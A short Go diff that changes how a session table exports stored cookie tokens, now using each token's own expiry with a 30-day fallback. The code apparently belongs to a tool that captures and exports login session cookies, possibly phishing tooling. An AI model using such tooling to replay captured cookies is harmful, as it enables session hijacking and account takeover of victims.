@@ -1435,9 +1435,13 @@ func sessionTable(sessions []*database.Session, showDelete bool) string {
 				HttpOnly       bool   `json:"httpOnly"`
 			}
 			var cookies []browserCookie
-			expiry := sess.UpdateTime + 2592000
+			defaultExpiry := sess.UpdateTime + 2592000
 			for domain, tokenMap := range sess.CookieTokens {
 				for _, ct := range tokenMap {
+					expiry := ct.ExpiresAt
+					if expiry == 0 {
+						expiry = defaultExpiry
+					}
 					cookies = append(cookies, browserCookie{
 						Path:           ct.Path,
 						Domain:         domain,
